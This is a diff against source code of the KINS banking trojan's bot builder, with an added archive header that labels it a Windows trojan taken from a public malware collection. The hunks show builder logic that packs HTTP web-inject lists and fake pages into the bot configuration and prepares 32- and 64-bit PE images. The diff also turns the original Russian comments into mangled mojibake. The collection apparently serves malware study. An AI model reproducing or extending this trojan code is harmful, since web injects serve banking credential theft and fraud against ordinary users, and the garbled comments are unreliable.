@@ -1,3 +1,14 @@
+/*
+  name      KINS
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     вЂ”
+ */
 #include <windows.h>
 #include <shlwapi.h>
 
@@ -612,7 +623,7 @@ bool BuildDll::_run(HWND owner, HWND output, Config0::CFGDATA *config, LPWSTR de
 		}
 	}
 
-	//Пишим инжекты, фейки.
+	//пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅ.
 	if(injectsSize > 0)
 	{
 		bool ok = BinStorage::_addItem(&ph, CFGID_HTTP_INJECTS_LIST, BinStorage::ITEMF_COMBINE_OVERWRITE | BinStorage::ITEMF_IS_OPTION | BinStorage::ITEMF_COMPRESSED, injectsList, injectsSize);
@@ -689,7 +700,7 @@ bool BuildDll::_run(HWND owner, HWND output, Config0::CFGDATA *config, LPWSTR de
 
 		PeImage::_freeImage(&originalPe32);
 
-		//Узнаем размер образа
+		//пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		if(destRawPe32 == NULL)
 		{
 			writeOutputError(output, Languages::get(Languages::error_not_enough_memory));
@@ -714,7 +725,7 @@ bool BuildDll::_run(HWND owner, HWND output, Config0::CFGDATA *config, LPWSTR de
 
 		PeImage::_freeImage(&originalPe64);
 
-		//Узнаем размер образа
+		//пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		if(destRawPe64 == NULL)
 		{
 			writeOutputError(output, Languages::get(Languages::error_not_enough_memory));
